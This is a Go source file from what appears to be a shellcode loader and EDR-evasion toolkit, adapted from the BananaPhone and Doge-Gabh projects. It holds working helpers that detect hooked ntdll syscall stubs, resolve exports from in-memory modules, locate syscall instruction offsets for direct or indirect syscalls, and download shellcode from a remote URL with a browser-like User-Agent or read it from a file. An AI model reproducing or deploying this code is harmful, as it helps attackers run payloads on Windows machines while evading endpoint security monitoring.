package core

import (
  "io"
  "os"
  "fmt"
  "time"
  "bytes"
  "unsafe"
  "strings"
  "net/http"
  "math/rand"
  "io/ioutil"
  "crypto/sha1"
  "encoding/binary"

  "golang.org/x/sys/windows"

  // Third-party packages
  "github.com/Binject/debug/pe"
)

/*

This code has been taken and modified from BananaPhone project

*/

const (
  ntdllpath       = "C:\\Windows\\System32\\ntdll.dll"
  kernel32path    = "C:\\Windows\\System32\\kernel32.dll"
)

const (
  IDX = 32
)

var HookCheck = []byte{0x4c, 0x8b, 0xd1, 0xb8} // Define hooked bytes to look for

type MayBeHookedError struct { // Define custom error for hooked functions
  Foundbytes []byte
}

func (e MayBeHookedError) Error() string {
  return fmt.Sprintf("may be hooked: wanted %x got %x", HookCheck, e.Foundbytes)
}

func rvaToOffset(pefile *pe.File, rva uint32) (uint32) {
  for _, hdr := range pefile.Sections {
    baseoffset := uint64(rva)
    if baseoffset > uint64(hdr.VirtualAddress) &&
      baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
      return rva - hdr.VirtualAddress + hdr.Offset
    }
  }
  return rva
}

func CheckBytes(b []byte) (uint16, error) {
  if bytes.HasPrefix(b, HookCheck) == true { // Check syscall bytes
    return 0, MayBeHookedError{Foundbytes: b}
  }
  
  return binary.LittleEndian.Uint16(b[4:8]), nil
}

// Generate a random integer between range
func RandomInt(max int, min int) (int) { // Return a random number between max and min
  rand.Seed(time.Now().UnixNano())
  rand_int := rand.Intn(max - min + 1) + min
  return rand_int
}

// Shellcode helper functions

func GetShellcodeFromUrl(sc_url string) ([]byte, error) { // Make request to URL return shellcode
  req, err := http.NewRequest("GET", sc_url, nil)
  if err != nil {
    return []byte(""), err
  }

  req.Header.Set("Accept", "application/x-www-form-urlencoded")
  req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")
  client := &http.Client{}
  resp, err := client.Do(req)
  if err != nil {
    return []byte(""), err
  }
  defer resp.Body.Close()

  b, err := io.ReadAll(resp.Body)
  if err != nil {
    return []byte(""), err
  }
  return b, nil
}

func GetShellcodeFromFile(file string) ([]byte, error) { // Read given file and return content in bytes
  f, err := os.Open(file)
  if err != nil {
    return []byte(""), err
  }
  defer f.Close()

  shellcode_bytes, err := ioutil.ReadAll(f)
  if err != nil {
    return []byte(""), err
  }

  return shellcode_bytes, nil
}

// Convert string to Sha1 (used for hashing)
func StrToSha1(str string) (string) {
  h := sha1.New()
  h.Write([]byte(str))
  bs := h.Sum(nil)
  return fmt.Sprintf("%x", bs)
}

/*

This code has been taken and modified from Doge-Gabh project

*/

type Export struct {
  Name           string
  VirtualAddress uintptr
}

type sstring struct {
  Length    uint16
  MaxLength uint16
  PWstr     *uint16
}

func (s sstring) String() (string) {
  return windows.UTF16PtrToString(s.PWstr)
}

func inMemLoads(modulename string) (uintptr, uintptr) {
  s, si, p := gMLO(0)
  start := p
  i := 1

  if (strings.Contains(strings.ToLower(p), strings.ToLower(modulename))) {
    return s, si
  }

  for {
    s, si, p = gMLO(i)

    if p != "" {
      if (strings.Contains(strings.ToLower(p), strings.ToLower(modulename))) {
        return s, si
      }
    }
    
    if (p == start) {
      break
    }

    i++
  }
  
  return 0, 0
}

func getExport(pModuleBase uintptr) []Export {
  var exports []Export
  var pImageNtHeaders = (*IMAGE_NT_HEADER)(unsafe.Pointer(pModuleBase + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(pModuleBase)).E_lfanew))) // ntH(pModuleBase)
  //IMAGE_NT_SIGNATURE
  if pImageNtHeaders.Signature != 0x00004550 {
    return nil
  }
  var pImageExportDirectory *imageExportDir

  pImageExportDirectory = ((*imageExportDir)(unsafe.Pointer(uintptr(pModuleBase + uintptr(pImageNtHeaders.OptionalHeader.DataDirectory[0].VirtualAddress)))))

  pdwAddressOfFunctions := pModuleBase + uintptr(pImageExportDirectory.AddressOfFunctions)
  pdwAddressOfNames := pModuleBase + uintptr(pImageExportDirectory.AddressOfNames)

  pwAddressOfNameOrdinales := pModuleBase + uintptr(pImageExportDirectory.AddressOfNameOrdinals)

  for cx := uintptr(0); cx < uintptr((pImageExportDirectory).NumberOfNames); cx++ {
    var export Export
    pczFunctionName := pModuleBase + uintptr(*(*uint32)(unsafe.Pointer(pdwAddressOfNames + cx*4)))
    pFunctionAddress := pModuleBase + uintptr(*(*uint32)(unsafe.Pointer(pdwAddressOfFunctions + uintptr(*(*uint16)(unsafe.Pointer(pwAddressOfNameOrdinales + cx*2)))*4)))
    export.Name = windows.BytePtrToString((*byte)(unsafe.Pointer(pczFunctionName)))
    export.VirtualAddress = uintptr(pFunctionAddress)
    exports = append(exports, export)
  }

  return exports
}

func memcpy(dst, src, size uintptr) {
  for i := uintptr(0); i < size; i++ {
    *(*uint8)(unsafe.Pointer(dst + i)) = *(*uint8)(unsafe.Pointer(src + i))
  }
}

func findFirstSyscallOffset(pMem []byte, size int, moduleAddress uintptr) int {
  
  offset := 0
  pattern1 := []byte{0x0f, 0x05, 0xc3}
  pattern2 := []byte{0xcc, 0xcc, 0xcc}

  // find first occurance of syscall+ret instructions
  for i := 0; i < size-3; i++ {
    instructions := []byte{pMem[i], pMem[i+1], pMem[i+2]}

    if (instructions[0] == pattern1[0]) && (instructions[1] == pattern1[1]) && (instructions[2] == pattern1[2]) {
      offset = i
      break
    }
  }

  // find the beginning of the syscall
  for i := 3; i < 50; i++ {
    instructions := []byte{pMem[offset-i], pMem[offset-i+1], pMem[offset-i+2]}
    if (instructions[0] == pattern2[0]) && (instructions[1] == pattern2[1]) && (instructions[2] == pattern2[2]) {
      offset = offset - i + 3
      break
    }
  }

  return offset
}

func findLastSyscallOffset(pMem []byte, size int, moduleAddress uintptr) int {

  offset := 0
  pattern := []byte{0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc}

  for i := size - 9; i > 0; i-- {
    instructions := []byte{pMem[i], pMem[i+1], pMem[i+2], pMem[i+3], pMem[i+4], pMem[i+5], pMem[i+6], pMem[i+7], pMem[i+8]}

    if (instructions[0] == pattern[0]) && (instructions[1] == pattern[1]) && (instructions[2] == pattern[2]) {
      offset = i + 6
      break
    }
  }

  return offset
}

func gMLO(i int) (start uintptr, size uintptr, modulepath string) {
  var badstring *sstring
  start, size, badstring = getMLO(i)
  modulepath = badstring.String()
  return
}

//getModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
func getMLO(i int) (start uintptr, size uintptr, modulepath *sstring)

func uint16Down(b []byte, idx uint16) uint16 {
  _ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
  return uint16(b[0]) - idx | uint16(b[1])<<8
}

func uint16Up(b []byte, idx uint16) uint16 {
  _ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
  return uint16(b[0]) + idx | uint16(b[1])<<8
}

func contains(slice []string, item string) bool {
  set := make(map[string]struct{}, len(slice))
  for _, s := range slice {
    set[s] = struct{}{}
  }

  _, ok := set[item]
  return ok
}


